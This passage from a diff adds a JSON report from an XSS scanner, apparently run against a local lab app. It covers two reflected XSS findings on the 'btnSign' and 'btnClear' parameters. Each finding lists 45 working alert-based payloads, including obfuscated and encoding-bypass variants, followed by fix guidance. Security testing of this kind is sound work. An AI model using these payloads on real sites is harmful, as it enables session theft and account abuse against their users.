+          {
+            "payload": "' onfocus='alert(\"s2n-xss\")' autofocus='",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onclick='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onload=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onclick=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onfocus=alert('s2n-xss') autofocus",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜svg onload=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          }
+        ],
+        "기타": [
+          {
+            "payload": "<iframe src=javascript:alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('전각문자')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('fullwidth')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          }
+        ],
+        "난독화": [
+          {
+            "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          },
+          {
+            "payload": "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          }
+        ],
+        "인코딩 우회": [
+          {
+            "payload": "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          }
+        ]
+      },
+      "all_payloads": [
+        "<script>alert('s2n-xss')</script>",
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert('s2n-xss')>",
+        "<svg onload=alert('s2n-xss')>",
+        "<body onload=alert('s2n-xss')>",
+        "<iframe src=javascript:alert('s2n-xss')>",
+        "<input onfocus=alert('s2n-xss') autofocus>",
+        "<select onfocus=alert('s2n-xss') autofocus>",
+        "<textarea onfocus=alert('s2n-xss') autofocus>",
+        "<details open ontoggle=alert('s2n-xss')>",
+        "<script>alert('테스트')</script>",
+        "<script>alert('한글XSS')</script>",
+        "<img src=x onerror=alert('한글')>",
+        "＜script＞alert('전각문자')＜/script＞",
+        "＜img src=x onerror=alert('전각')＞",
+        "<script>console.log('UTF-8테스트:가나다')</script>",
+        "\" onload=\"alert('s2n-xss')\"",
+        "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+        "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+        "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+        "<img/src=x/onerror=alert('s2n-xss')>",
+        "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+        "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+        "<svg/onload=alert('s2n-xss')>",
+        "<!--<script>alert('s2n-xss')</script>-->",
+        "<script><!--alert('s2n-xss')//--></script>",
+        "<script>alert('EUC-KR테스트')</script>",
+        "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+        "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+        "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+        "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+        "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+        "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+        "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+        "' onload='alert(\"s2n-xss\")'",
+        "' onfocus='alert(\"s2n-xss\")' autofocus='",
+        "' onclick='alert(\"s2n-xss\")'",
+        "'><script>alert('s2n-xss')</script>",
+        "onload=alert('s2n-xss')",
+        "onclick=alert('s2n-xss')",
+        "onfocus=alert('s2n-xss') autofocus",
+        "＜script＞alert('fullwidth')＜/script＞",
+        "＜img src=x onerror=alert('fullwidth')＞",
+        "＜svg onload=alert('fullwidth')＞"
+      ],
+      "description": {
+        "korean": "'btnSign' 파라미터에서 XSS 취약점이 발견되었습니다. 45개의 서로 다른 페이로드가 모두 성공했으며, 이는 입력 검증이 전혀 없음을 의미합니다.",
+        "english": "XSS vulnerability found in parameter 'btnSign'. All 45 different payloads succeeded, indicating no input validation."
+      },
+      "impact": {
+        "korean": [
+          "사용자 세션 쿠키 탈취",
+          "사용자 계정 권한으로 악의적 행위 수행",
+          "피싱 페이지로 리다이렉트",
+          "사용자 입력 정보 탈취"
+        ],
+        "english": [
+          "Session cookie theft",
+          "Unauthorized actions with user privileges",
+          "Redirection to phishing pages",
+          "User input data exfiltration"
+        ]
+      },
+      "fix_recommendation": {
+        "priority": "CRITICAL",
+        "estimated_fix_time": "30 minutes",
+        "complexity": "LOW",
+        "summary": {
+          "korean": "모든 사용자 입력값을 출력하기 전 HTML 이스케이프 처리가 필요합니다. 또한 Content Security Policy (CSP) 헤더를 설정하여 XSS 공격을 방어하세요.",
+          "english": "All user inputs must be HTML-escaped before output. Additionally, implement Content Security Policy (CSP) headers."
+        },
+        "step_by_step": [
+          {
+            "step": 1,
+            "action": "취약한 코드 찾기",
+            "details": "파라미터 'btnSign'를 처리하는 코드 위치 확인"
+          },
+          {
+            "step": 2,
+            "action": "HTML 이스케이프 적용",
+            "details": "출력 전 특수문자(<, >, \", ', &) 이스케이프 처리"
+          },
+          {
+            "step": 3,
+            "action": "CSP 헤더 설정",
+            "details": "Content-Security-Policy 헤더로 인라인 스크립트 차단"
+          },
+          {
+            "step": 4,
+            "action": "테스트 및 검증",
+            "details": "URL: http://localhost:8081/vulnerabilities/xss_s/?btnSign=<script>alert(1)</script> 테스트"
+          }
+        ],
+        "code_examples": {
+          "php": {
+            "vulnerable": "echo $_GET['btnSign'];  // VULNERABLE",
+            "fixed": "echo htmlspecialchars($_GET['btnSign'], ENT_QUOTES, 'UTF-8');  // SECURE"
+          },
+          "python": {
+            "vulnerable": "return user_input  # VULNERABLE",
+            "fixed": "from html import escape\nreturn escape(user_input)  # SECURE"
+          },
+          "javascript": {
+            "vulnerable": "element.innerHTML = userInput;  // VULNERABLE",
+            "fixed": "element.textContent = userInput;  // SECURE"
+          },
+          "csp_header": "Content-Security-Policy: default-src 'self'; script-src 'self'"
+        }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/",
+        "https://portswigger.net/web-security/cross-site-scripting",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+        "https://developer.mozilla.org/ko/docs/Web/Security/Types_of_attacks#%ED%81%AC%EB%A1%9C%EC%8A%A4_%EC%82%AC%EC%9D%B4%ED%8A%B8_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85_xss"
+      ]
+    },
+    {
+      "vulnerability_id": "XSS-004",
+      "scanner": "s2n-xss",
+      "version": "2.1-improved",
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "vulnerability_type_ko": "크로스 사이트 스크립팅 (XSS)",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "xss_type": "Reflected XSS",
+      "location": {
+        "url": "http://localhost:8081/vulnerabilities/xss_s/",
+        "parameter": "btnClear",
+        "method": "POST"
+      },
+      "payload_summary": {
+        "total_successful": 45,
+        "categories": [
+          "기본 스크립트 태그",
+          "이벤트 핸들러",
+          "기타",
+          "난독화",
+          "인코딩 우회"
+        ],
+        "first_detected": "2025-11-04 17:56:36"
+      },
+      "payloads_by_category": {
+        "기본 스크립트 태그": [
+          {
+            "payload": "<script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert(1)</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('한글XSS')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>console.log('UTF-8테스트:가나다')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<!--<script>alert('s2n-xss')</script>-->",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script><!--alert('s2n-xss')//--></script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('EUC-KR테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "'><script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          }
+        ],
+        "이벤트 핸들러": [
+          {
+            "payload": "<img src=x onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<body onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<input onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<select onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<textarea onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<details open ontoggle=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img src=x onerror=alert('한글')>",
+            "context": "korean_euc_kr",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('전각')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onload=\"alert('s2n-xss')\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img/src=x/onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg/onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onload='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onfocus='alert(\"s2n-xss\")' autofocus='",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onclick='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onload=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onclick=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onfocus=alert('s2n-xss') autofocus",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜svg onload=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          }
+        ],
+        "기타": [
+          {
+            "payload": "<iframe src=javascript:alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('전각문자')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('fullwidth')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          }
+        ],
+        "난독화": [
+          {
+            "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          },
+          {
+            "payload": "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          }
+        ],
+        "인코딩 우회": [
+          {
+            "payload": "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          }
+        ]
+      },
+      "all_payloads": [
+        "<script>alert('s2n-xss')</script>",
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert('s2n-xss')>",
+        "<svg onload=alert('s2n-xss')>",
+        "<body onload=alert('s2n-xss')>",
+        "<iframe src=javascript:alert('s2n-xss')>",
+        "<input onfocus=alert('s2n-xss') autofocus>",
+        "<select onfocus=alert('s2n-xss') autofocus>",
+        "<textarea onfocus=alert('s2n-xss') autofocus>",
+        "<details open ontoggle=alert('s2n-xss')>",
+        "<script>alert('테스트')</script>",
+        "<script>alert('한글XSS')</script>",
+        "<img src=x onerror=alert('한글')>",
+        "＜script＞alert('전각문자')＜/script＞",
+        "＜img src=x onerror=alert('전각')＞",
+        "<script>console.log('UTF-8테스트:가나다')</script>",
+        "\" onload=\"alert('s2n-xss')\"",
+        "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+        "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+        "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+        "<img/src=x/onerror=alert('s2n-xss')>",
+        "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+        "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+        "<svg/onload=alert('s2n-xss')>",
+        "<!--<script>alert('s2n-xss')</script>-->",
+        "<script><!--alert('s2n-xss')//--></script>",
+        "<script>alert('EUC-KR테스트')</script>",
+        "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+        "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+        "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+        "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+        "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+        "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+        "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+        "' onload='alert(\"s2n-xss\")'",
+        "' onfocus='alert(\"s2n-xss\")' autofocus='",
+        "' onclick='alert(\"s2n-xss\")'",
+        "'><script>alert('s2n-xss')</script>",
+        "onload=alert('s2n-xss')",
+        "onclick=alert('s2n-xss')",
+        "onfocus=alert('s2n-xss') autofocus",
+        "＜script＞alert('fullwidth')＜/script＞",
+        "＜img src=x onerror=alert('fullwidth')＞",
+        "＜svg onload=alert('fullwidth')＞"
+      ],
+      "description": {
+        "korean": "'btnClear' 파라미터에서 XSS 취약점이 발견되었습니다. 45개의 서로 다른 페이로드가 모두 성공했으며, 이는 입력 검증이 전혀 없음을 의미합니다.",
+        "english": "XSS vulnerability found in parameter 'btnClear'. All 45 different payloads succeeded, indicating no input validation."
+      },
+      "impact": {
+        "korean": [
+          "사용자 세션 쿠키 탈취",
+          "사용자 계정 권한으로 악의적 행위 수행",
+          "피싱 페이지로 리다이렉트",
+          "사용자 입력 정보 탈취"
+        ],
+        "english": [
+          "Session cookie theft",
+          "Unauthorized actions with user privileges",
+          "Redirection to phishing pages",
+          "User input data exfiltration"
+        ]
+      },
+      "fix_recommendation": {
+        "priority": "CRITICAL",
+        "estimated_fix_time": "30 minutes",
+        "complexity": "LOW",
+        "summary": {
+          "korean": "모든 사용자 입력값을 출력하기 전 HTML 이스케이프 처리가 필요합니다. 또한 Content Security Policy (CSP) 헤더를 설정하여 XSS 공격을 방어하세요.",
+          "english": "All user inputs must be HTML-escaped before output. Additionally, implement Content Security Policy (CSP) headers."
+        },
+        "step_by_step": [
+          {
+            "step": 1,
+            "action": "취약한 코드 찾기",
+            "details": "파라미터 'btnClear'를 처리하는 코드 위치 확인"
+          },
+          {
+            "step": 2,
+            "action": "HTML 이스케이프 적용",
+            "details": "출력 전 특수문자(<, >, \", ', &) 이스케이프 처리"
+          },
+          {
+            "step": 3,
+            "action": "CSP 헤더 설정",
+            "details": "Content-Security-Policy 헤더로 인라인 스크립트 차단"
+          },
+          {
+            "step": 4,
+            "action": "테스트 및 검증",
+            "details": "URL: http://localhost:8081/vulnerabilities/xss_s/?btnClear=<script>alert(1)</script> 테스트"
+          }
+        ],
+        "code_examples": {
+          "php": {
+            "vulnerable": "echo $_GET['btnClear'];  // VULNERABLE",
+            "fixed": "echo htmlspecialchars($_GET['btnClear'], ENT_QUOTES, 'UTF-8');  // SECURE"
+          },
+          "python": {
+            "vulnerable": "return user_input  # VULNERABLE",
+            "fixed": "from html import escape\nreturn escape(user_input)  # SECURE"
+          },
+          "javascript": {
+            "vulnerable": "element.innerHTML = userInput;  // VULNERABLE",
+            "fixed": "element.textContent = userInput;  // SECURE"
+          },
+          "csp_header": "Content-Security-Policy: default-src 'self'; script-src 'self'"
+        }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/",
+        "https://portswigger.net/web-security/cross-site-scripting",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+        "https://developer.mozilla.org/ko/docs/Web/Security/Types_of_attacks#%ED%81%AC%EB%A1%9C%EC%8A%A4_%EC%82%AC%EC%9D%B4%ED%8A%B8_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85_xss"
+      ]
+    }
+  ],
+  "executive_summary": {
+    "korean": "4개의 고유한 XSS 취약점이 발견되었습니다. 총 180개의 페이로드가 성공했으며, 이는 입력 검증이 부족함을 나타냅니다.",
+    "english": "Found 4 unique XSS vulnerabilities. 180 payloads succeeded, indicating insufficient input validation."
+  },
+  "timestamp": "2025-11-04 17:56:36"
+}
